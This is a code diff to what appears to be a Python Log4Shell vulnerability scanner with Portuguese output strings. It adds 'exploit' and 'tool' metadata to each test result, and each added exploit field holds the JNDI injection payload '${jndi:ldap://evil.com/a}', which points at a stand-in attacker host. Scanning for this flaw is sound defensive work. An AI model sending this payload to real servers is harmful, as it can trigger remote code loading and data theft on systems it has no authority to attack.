@@ -30,6 +30,7 @@ from mytools.core.utils import (
     color,
     create_async_client,
     create_banner,
+    print_exploit_info,
     run_main_loop,
     safe_asyncio_run,
     write_output,
@@ -102,6 +103,8 @@ async def _test_jndi_basic(
                 details = "Possivel log4j detectado na resposta"
 
             results.append(Log4ShellAttempt(
+            exploit="${jndi:ldap://evil.com/a}",
+            tool="log4j-scan",
                 technique=technique,
                 category="jndi_basic",
                 header_name=header_name,
@@ -153,6 +156,8 @@ async def _test_jndi_obfuscated(
                 details = "Ofuscado payload refletido no body"
 
             results.append(Log4ShellAttempt(
+            exploit="${jndi:ldap://evil.com/a}",
+            tool="log4j-scan",
                 technique=technique,
                 category="jndi_obfuscated",
                 header_name=header_name,
@@ -208,6 +213,8 @@ async def _test_header_injection(
                 details = f"Token via {header_name} encontrado"
 
             results.append(Log4ShellAttempt(
+            exploit="${jndi:ldap://evil.com/a}",
+            tool="log4j-scan",
                 technique=technique,
                 category="header_injection",
                 header_name=header_name,
@@ -259,6 +266,8 @@ async def _test_data_exfil(
                 details = f"Exfil payload refletido via {header_name}"
 
             results.append(Log4ShellAttempt(
+            exploit="${jndi:ldap://evil.com/a}",
+            tool="log4j-scan",
                 technique=technique,
                 category="data_exfil",
                 header_name=header_name,
@@ -310,6 +319,8 @@ async def _test_bypass(
                 details = f"Bypass payload refletido via {header_name}"
 
             results.append(Log4ShellAttempt(
+            exploit="${jndi:ldap://evil.com/a}",
+            tool="log4j-scan",
                 technique=technique,
                 category="bypass",
                 header_name=header_name,
@@ -346,6 +357,8 @@ class Log4ShellAttempt:
     vulnerable: bool
     details: str
     error: str
+    exploit: str = ""
+    tool: str = ""
 
 
 @dataclass(frozen=True, slots=True)
@@ -387,6 +400,7 @@ def print_results(result: Log4ShellResult) -> None:
             print(color(f"      Status: {a.status}", Cyber.WHITE))
             if a.details:
                 print(color(f"      Detalhes: {a.details}", Cyber.GRAY))
+            print_exploit_info(a.exploit, a.tool)
         print(color(f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis", Cyber.WHITE))
     else:
         print(color("\n  [-] Nenhum Log4Shell detectado", Cyber.YELLOW))
